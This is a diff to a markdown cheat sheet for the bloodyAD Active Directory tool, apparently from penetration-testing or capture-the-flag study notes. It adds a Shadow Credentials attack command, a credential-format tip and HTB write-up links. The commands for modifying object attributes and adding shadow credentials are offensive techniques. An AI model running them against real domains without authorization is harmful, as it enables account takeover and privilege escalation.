@@ -59,12 +59,18 @@ bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
 ```
+### Shadow Credentials
+```
+bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
+```
 ### Notes
 - To use Kerberos, obtain a TGT, export it, and then pass `-k` instead of providing a username and password
 - You can pass a user hash instead of a password using `-p :hash` 
+- Specify format for '--password' or '-k <keyfile>' using `-f`, e.g. `-f rc4`
 ### Resources
 - https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 - https://0xdf.gitlab.io/2024/03/30/htb-rebound.html
+- https://0xdf.gitlab.io/2025/04/26/htb-vintage.html
 - https://www.thehacker.recipes/
 ### Machines To Practice
 - Redelegate (Vulnlab)
